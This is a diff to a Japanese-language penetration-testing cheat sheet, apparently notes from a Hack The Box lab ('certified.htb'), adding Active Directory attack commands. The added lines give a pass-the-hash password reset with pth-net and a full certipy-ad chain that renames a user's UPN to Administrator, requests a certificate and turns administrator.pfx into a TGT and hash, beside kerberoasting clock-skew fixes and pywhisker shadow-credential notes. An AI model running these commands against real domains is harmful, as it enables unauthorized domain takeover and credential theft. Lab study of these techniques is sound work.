@@ -20,6 +20,17 @@ kerberoastを実行したときKRB_AP_ERR_SKEW(Clock skew too great)というエ
 systemctl stop systemd-timesyncd #いったん自分の時刻規制をとめて
 sudo ntpdate -u <IP> #ntpdateで相手と同期
 
+//pth-toolkit
+パスザハッシュのツールいろいろできる
+pth-net rpc password "<target_user>" "12345678" -U "<domain>"/"<own user>"%"<hash>" -S "<dc>" #own userからgenericAllなどが効く対象のパスを変更する
+
+//certipy-ad
+Active Directory 証明書サービス (AD CS) を列挙して悪用するための攻撃ツール
+certipy-ad find -u <user>@<domain> -p <pass> -dc-ip <IP>　＃CAの構成の確認
+certipy-ad account update -username <own_user>@<domain> -hashes <hash> -user <target_user> -upn Administrator　＃ユーザプリンシパルネームの変更（target_userをAdministratorに変えた）
+certipy-ad req -username <user>@<domain> -p <pass> -ca <CA_name> -template CertifiedAuthentication -debug　＃administrator.pfx（証明書）の入手、確認
+certipy-ad auth -pfx administrator.pfx -domain certified.htb　＃administrator.pfxを利用してTGTとハッシュを入手
+
 //pywhisker
 pyWhisker は、ターゲットの msDs-KeyCredentialLink 属性に対してさまざまなアクションを実行するために使用できる
 list:現在のすべての KeyCredentials ID と作成時刻を一覧表示
